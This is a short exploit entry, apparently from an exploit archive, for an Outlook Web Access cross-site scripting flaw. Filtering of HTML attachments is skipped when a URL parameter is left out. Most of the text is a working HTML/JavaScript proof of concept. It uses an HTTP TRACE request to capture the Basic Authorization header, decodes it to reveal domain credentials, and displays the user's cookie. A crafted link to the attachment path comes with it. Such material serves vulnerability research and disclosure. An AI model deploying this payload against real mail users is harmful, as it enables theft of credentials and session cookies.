@@ -1,0 +1,74 @@
+source: http://www.securityfocus.com/bid/8113/info
+
+OWA contains a vulnerability that may result in attacker-supplied script code executing within the context of the mail interface when processing e-mail containing HTML message attachments. 
+
+It is possible to prevent filtering of the attachment by omitting a certain URI parameter from a generated URL.
+
+If did parameter does not exist, no filtering will be performed. Unfiltered, the script code will execute if embedded in an HTML email opened by a user.
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML>
+<BODY bgColor=#ffffff>
+<script type="text/javascript">
+var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP")
+xmlHttp.open("TRACE", "./", false)
+
+xmlHttp.send()
+xmlDoc=xmlHttp.responseText
+
+
+str1=xmlHttp.responseText
+
+splitString = str1.split("Authorization: Basic ")
+str2=splitString[1]
+
+var base64 = [
+'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', // 0 to 7
+'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', // 8 to 15
+'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', // 16 to 23
+'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', // 24 to 31
+'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', // 32 to 39
+'o', 'p', 'q', 'r', 's', 't', 'u', 'v', // 40 to 47
+'w', 'x', 'y', 'z', '0', '1', '2', '3', // 48 to 55
+'4', '5', '6', '7', '8', '9', '+', '/' ]; // 56 to 63
+
+function reverseBase64 () {
+var r = new Object();
+for (var i = 0; i < 64; i++) {
+r[base64[i]] = i;
+}
+return r;
+}
+
+var reversedBase64 = reverseBase64();
+
+function decode (encStr) {
+var charCodes = new Array();
+var decStr = "";
+for (var i = 0; i < encStr.length; i++)
+charCodes[i] = reversedBase64[encStr.charAt(i)];
+for (var i = 0; i < encStr.length; i += 4) {
+var bits24 = ( charCodes [i] & 0xFF ) << 18;
+bits24 |= ( charCodes [i + 1] & 0xFF ) << 12;
+bits24 |= ( charCodes [i + 2] & 0xFF ) << 6;
+bits24 |= ( charCodes [i + 3] & 0xFF ) << 0;
+decStr += String.fromCharCode((bits24 & 0xFF0000) >> 16);
+if (encStr.charAt(i + 2) != '=') // check for padding character =
+decStr += String.fromCharCode((bits24 & 0xFF00) >> 8);
+if (encStr.charAt(i + 3) != '=') // check for padding character =
+decStr += String.fromCharCode((bits24 & 0xFF) >> 0);
+}
+return decStr;
+}
+
+document.write("Your cookie is: ");
+document.write(document.cookie);
+document.write("<BR>Your domain credentials are: ")
+document.write(decode(str2));
+
+
+</script>
+
+<DIV><FONT face=Arial size=2><A
+href="http://<IP_or_name_of_the_server>/exchange/<username>/<inbox_name>/<subject>.EML/
+1_multipart/2_text.htm">http://www.ilikemarijuana.com</A></FONT></DIV></BODY></HTML>
